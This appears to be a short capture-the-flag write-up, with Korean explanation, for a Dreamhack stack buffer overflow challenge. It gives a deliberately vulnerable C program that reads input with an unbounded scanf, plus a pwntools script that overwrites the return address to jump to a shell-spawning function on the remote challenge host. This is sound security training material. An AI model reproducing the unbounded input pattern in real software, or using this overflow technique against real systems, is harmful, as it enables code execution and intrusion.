## Return Address Overwrite
---

```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};

  execve(cmd, args, NULL);
}

int main() {
  char buf[0x28];

  init();

  printf("Input: ");
  scanf("%s", buf);

  return 0;
}
```

<br><br>

## Solution
---

local에서 파일을 gdb로 분석해서 get_shell 함수의 주소를 알아낸 뒤, gdb로 분석해보면 입력값을 rbp-0x30에서 받는다.

따라서 0x30만큼 값을 넣고, sfp 8바이트를 채워준 뒤, 리턴 주소에 get_shell 주소를 넣어주면 된다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games', 13357)

get_shell_addr = p64(0x4006aa)

payload = b"a"*0x30 + b"b"*8 + get_shell_addr
p.sendlineafter(":",payload)
p.interactive()
```

